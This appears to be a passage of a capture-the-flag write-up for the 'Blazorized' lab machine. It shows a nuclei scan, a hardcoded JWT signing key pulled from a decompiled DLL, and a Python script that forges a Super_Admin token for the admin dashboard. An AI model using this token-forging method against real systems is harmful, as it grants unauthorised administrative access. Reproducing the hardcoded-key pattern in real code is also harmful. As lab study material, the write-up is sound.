```sh
nuclei -u http://blazorized.htb -t cves/ -t exposures/ -t http/ -t dast/
```
```
                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.2.9

                projectdiscovery.io

[WRN] Found 4 template[s] loaded with deprecated paths, update before v3 for continued support.
[INF] Current nuclei version: v3.2.9 (outdated)
[INF] Current nuclei-templates version: v9.9.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 67
[INF] Templates loaded for current scan: 7681
[INF] Executing 7481 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 200 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1530 (Reduced 1439 Requests)
[INF] Using Interactsh Server: oast.me
[options-method] [http] [info] http://blazorized.htb ["OPTIONS, TRACE, GET, HEAD, POST"]                                                                  
[tech-detect:ms-iis] [http] [info] http://blazorized.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://blazorized.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://blazorized.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://blazorized.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://blazorized.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://blazorized.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://blazorized.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://blazorized.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://blazorized.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://blazorized.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://blazorized.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://blazorized.htb
[blazor-webassembly-detect] [http] [info] http://blazorized.htb/_framework/blazor.boot.json ["7.0.15."]
[blazor-boot] [http] [info] http://blazorized.htb/_framework/blazor.boot.json [""Microsoft.Extensions.Configuration.Abstractions.dll"",""Microsoft.Extensions.Configuration.dll"",""System.dll"",""System.Linq.dll"",""System.Runtime.InteropServices.dll"",""System.Runtime.Numerics.dll"",""System.Threading.Thread.dll"",""Blazorized.DigitalGarden.dll"",""System.ComponentModel.dll"",""System.Formats.Asn1.dll"",""System.Net.Http.Json.dll"",""Microsoft.AspNetCore.Components.Web.dll"",""Microsoft.AspNetCore.Components.WebAssembly.dll"",""Microsoft.Extensions.DependencyInjection.Abstractions.dll"",""Microsoft.Extensions.Logging.Abstractions.dll"",""Microsoft.Extensions.Options.dll"",""Microsoft.IdentityModel.Logging.dll"",""MudBlazor.Markdown.dll"",""System.IdentityModel.Tokens.Jwt.dll"",""Markdig.dll"",""System.Console.dll"",""System.Runtime.CompilerServices.Unsafe.dll"",""System.Security.Cryptography.Encoding.dll"",""Microsoft.Extensions.DependencyInjection.dll"",""Microsoft.IdentityModel.Tokens.dll"",""System.Private.CoreLib.dll"",""System.Text.RegularExpressions.dll"",""System.Xml.ReaderWriter.dll"",""Microsoft.AspNetCore.Components.Forms.dll"",""Microsoft.Extensions.Http.dll"",""Microsoft.Extensions.Primitives.dll"",""System.ComponentModel.Primitives.dll"",""System.ObjectModel.dll"",""System.Security.Cryptography.Primitives.dll"",""Blazorized.Shared.dll"",""Microsoft.Extensions.Logging.dll"",""System.Collections.dll"",""System.Security.Cryptography.dll"",""Microsoft.Extensions.Localization.dll"",""Microsoft.IdentityModel.Abstractions.dll"",""System.Runtime.InteropServices.JavaScript.dll"",""System.Security.Cryptography.Csp.dll"",""System.Security.Cryptography.X509Certificates.dll"",""System.Threading.dll"",""Blazored.LocalStorage.dll"",""System.Collections.Concurrent.dll"",""System.Private.Uri.dll"",""System.Security.Cryptography.Algorithms.dll"",""System.Runtime.Intrinsics.dll"",""System.Security.Cryptography.Cng.dll"",""Microsoft.JSInterop.dll"",""Microsoft.JSInterop.WebAssembly.dll"",""System.Text.Json.dll"",""System.IO.Compression.dll"",""System.Security.Claims.dll"",""Microsoft.AspNetCore.Components.dll"",""MudBlazor.dll"",""System.ComponentModel.TypeConverter.dll"",""System.Memory.dll"",""System.Net.Http.dll"",""System.Private.Xml.dll"",""Microsoft.IdentityModel.JsonWebTokens.dll"",""System.Net.Primitives.dll"",""System.Runtime.dll"",""Blazorized.Helpers.dll"",""Microsoft.Extensions.Configuration.Json.dll"",""Microsoft.Extensions.Localization.Abstractions.dll"",""System.ComponentModel.Annotations.dll"",""System.Linq.Expressions.dll"",""System.Text.Encodings.Web.dll""]                          
[microsoft-iis-version] [http] [info] http://blazorized.htb ["Microsoft-IIS/10.0"]
[waf-detect:modsecurity] [http] [info] http://blazorized.htb

```
Blazorized.Helpers.dll is the weird one. let's try to get it
Inside of this dll we find
```csharp
namespace Blazorized.Helpers

{

  public static class JWT

  {

    private const long EXPIRATION_DURATION_IN_SECONDS = 60;

    private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";

    private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";

    private static readonly string postsPermissionsClaimValue = "Posts_Get_All";

    private static readonly string categoriesPermissionsClaimValue = "Categories_Get_All";

    private static readonly string superAdminRoleClaimValue = "Super_Admin";

    private static readonly string issuer = "http://api.blazorized.htb";

    private static readonly string apiAudience = "http://api.blazorized.htb";

    private static readonly string adminDashboardAudience = "http://admin.blazorized.htb";
```
So let's add api & admin to our etc/hosts.

Using this python code made by Hype we can do the things
```python
# constants.py
# Define constants
EXPIRATION_DURATION_IN_SECONDS = 60
JWT_SYMMETRIC_SECURITY_KEY = ("8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a")
SUPER_ADMIN_EMAIL_CLAIM_VALUE = "superadmin@blazorized.htb"
POSTS_PERMISSIONS_CLAIM_VALUE = "Posts_Get_All"
CATEGORIES_PERMISSIONS_CLAIM_VALUE = "Categories_Get_All"
SUPER_ADMIN_ROLE_CLAIM_VALUE = "Super_Admin"
ISSUER = "http://api.blazorized.htb"
API_AUDIENCE = "http://api.blazorized.htb"
ADMIN_DASHBOARD_AUDIENCE = "http://admin.blazorized.htb"

# jwt_generator.py
import jwt
import datetime
from typing import List, Dict

def get_signing_credentials() -> Dict:
    try:
        secret = JWT_SYMMETRIC_SECURITY_KEY.encode()
        return {"key": secret, "algorithm": "HS512"}
    except Exception as e:
        raise e

def generate_super_admin_jwt(expiration_duration_in_seconds: int = EXPIRATION_DURATION_IN_SECONDS) -> str:
    try:
        now = datetime.datetime.utcnow()
        expiration = now + datetime.timedelta(seconds=expiration_duration_in_seconds)
        
        claims = {
            "email": SUPER_ADMIN_EMAIL_CLAIM_VALUE,
            "role": SUPER_ADMIN_ROLE_CLAIM_VALUE,
            "iss": ISSUER,
            "aud": ADMIN_DASHBOARD_AUDIENCE,
            "iat": now,
            "exp": expiration
        }

        signing_credentials = get_signing_credentials()
        token = jwt.encode(claims, signing_credentials["key"], algorithm=signing_credentials["algorithm"])
        
        return token
    except Exception as e:
        raise e

# Example usage
if __name__ == "__main__":
    token = generate_super_admin_jwt()
    print(token)
```
